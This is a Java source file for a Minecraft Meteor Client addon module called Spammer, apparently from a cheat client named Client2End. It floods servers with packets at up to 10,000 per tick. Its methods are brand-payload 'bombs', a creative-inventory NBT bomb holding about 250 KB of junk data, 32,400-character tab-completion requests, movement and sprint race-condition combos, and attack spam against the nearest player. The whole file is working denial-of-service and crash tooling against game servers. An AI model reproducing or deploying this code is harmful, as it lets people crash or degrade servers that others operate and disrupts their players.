package com.client2end.addon.modules;

import com.client2end.addon.Client2End;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.EnumSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.entity.player.PlayerEntity;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.NbtComponent;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.network.packet.BrandCustomPayload;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import net.minecraft.network.packet.c2s.play.ClientCommandC2SPacket;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractEntityC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractItemC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import net.minecraft.text.Text;
import net.minecraft.util.Hand;

public class Spammer extends Module {
    public enum Method {
        Sprint("Sprint toggle"),
        Move("Move spam"),
        Attack("Entity attack"),
        Payload("Brand payload"),
        PayloadBomb("Brand 32K bomb"),
        Race("Race condition combo"),
        CreativeBomb("Creative NBT bomb"),
        TabComplete("Tab complete spam"),
        InteractItem("Item use spam");

        private final String title;
        Method(String title) { this.title = title; }
        @Override public String toString() { return title; }
    }

    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Method> method = sgGeneral.add(new EnumSetting.Builder<Method>()
        .name("method")
        .description("Spam method")
        .defaultValue(Method.Sprint)
        .build()
    );

    private final Setting<Integer> packetsPerTick = sgGeneral.add(new IntSetting.Builder()
        .name("packets-per-tick")
        .description("Packets per tick (20 ticks/sec)")
        .defaultValue(1)
        .min(1)
        .max(10000)
        .sliderRange(1, 10000)
        .build()
    );

    private boolean running = false;
    private int sent = 0;
    private boolean toggle = false;
    private boolean flip = false;
    private int payloadId = 0;

    public Spammer() {
        super(Client2End.CATEGORY, "spammer", "C2S packet spammer with multiple methods");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (!running || mc.player == null || mc.getNetworkHandler() == null) return;

        int count = packetsPerTick.get();

        switch (method.get()) {
            case Sprint -> spamSprint(count);
            case Move -> spamMove(count);
            case Attack -> spamAttack(count);
            case Payload -> spamPayload(count);
            case PayloadBomb -> spamPayloadBomb(count);
            case Race -> spamRace(count);
            case CreativeBomb -> spamCreativeBomb(count);
            case TabComplete -> spamTabComplete(count);
            case InteractItem -> spamInteractItem(count);
        }

        sent += count;
        mc.player.sendMessage(Text.literal("[§5Spammer§r] §e" + sent + " §7(" + (count * 20) + "/sec)"), false);
    }

    private void spamSprint(int count) {
        for (int i = 0; i < count; i++) {
            mc.getNetworkHandler().sendPacket(new ClientCommandC2SPacket(
                mc.player,
                toggle ? ClientCommandC2SPacket.Mode.START_SPRINTING : ClientCommandC2SPacket.Mode.STOP_SPRINTING
            ));
            toggle = !toggle;
        }
    }

    private void spamMove(int count) {
        double baseX = mc.player.getX();
        double baseY = mc.player.getY();
        double baseZ = mc.player.getZ();
        float yaw = mc.player.getYaw();
        float pitch = mc.player.getPitch();

        for (int i = 0; i < count; i++) {
            flip = !flip;
            double ox = flip ? 0.5 : -0.5;
            mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.Full(
                baseX + ox, baseY, baseZ,
                yaw, pitch, true, true
            ));
        }
    }

    private void spamAttack(int count) {
        PlayerEntity target = mc.world.getClosestPlayer(mc.player, 6);
        if (target == null || target == mc.player || !target.isAlive()) return;

        for (int i = 0; i < count; i++) {
            mc.getNetworkHandler().sendPacket(PlayerInteractEntityC2SPacket.attack(target, mc.player.isSneaking()));
        }
    }

    private void spamPayload(int count) {
        for (int i = 0; i < count; i++) {
            payloadId++;
            String brand = "Client2End" + "A".repeat(Math.min(payloadId, 1000));
            mc.getNetworkHandler().sendPacket(new CustomPayloadC2SPacket(new BrandCustomPayload(brand)));
        }
    }

    private void spamPayloadBomb(int count) {
        String s = "B".repeat(250);
        for (int i = 0; i < count; i++) {
            s = i + s.substring(1);
            mc.getNetworkHandler().sendPacket(new CustomPayloadC2SPacket(new BrandCustomPayload(s)));
        }
    }

    private void spamRace(int count) {
        double baseX = mc.player.getX();
        double baseY = mc.player.getY();
        double baseZ = mc.player.getZ();

        for (int i = 0; i < count; i++) {
            toggle = !toggle;
            mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.Full(
                baseX + 0.5, baseY - 0.5, baseZ,
                0, 90, true, true
            ));
            mc.getNetworkHandler().sendPacket(new ClientCommandC2SPacket(
                mc.player,
                toggle ? ClientCommandC2SPacket.Mode.START_SPRINTING : ClientCommandC2SPacket.Mode.STOP_SPRINTING
            ));
            mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.Full(
                baseX + 0.5, baseY - 0.5, baseZ,
                0, 90, true, true
            ));
        }
    }

    private void spamCreativeBomb(int count) {
        ItemStack stack = new ItemStack(Items.DIAMOND);
        NbtCompound nbt = new NbtCompound();
        for (int i = 0; i < 500; i++) {
            nbt.putString("k" + i, "V".repeat(500));
        }
        NbtComponent.set(DataComponentTypes.CUSTOM_DATA, stack, nbt);
        for (int i = 0; i < count; i++) {
            mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(1, stack));
        }
    }

    private void spamTabComplete(int count) {
        String cmd = "/" + "a".repeat(32400);
        for (int i = 0; i < count; i++) {
            mc.getNetworkHandler().sendPacket(new RequestCommandCompletionsC2SPacket(i, cmd));
        }
    }

    private void spamInteractItem(int count) {
        for (int i = 0; i < count; i++) {
            mc.getNetworkHandler().sendPacket(new PlayerInteractItemC2SPacket(
                Hand.MAIN_HAND, 0, mc.player.getYaw(), mc.player.getPitch()
            ));
        }
    }

    @Override
    public void onActivate() {
        running = true;
        sent = 0;
        toggle = false;
        flip = false;
        payloadId = 0;
    }

    @Override
    public void onDeactivate() {
        running = false;
        if (mc.player != null) {
            mc.player.sendMessage(Text.literal("[§5Spammer§r] §cTotal: §e" + sent + " §rpackets"), false);
        }
    }
}
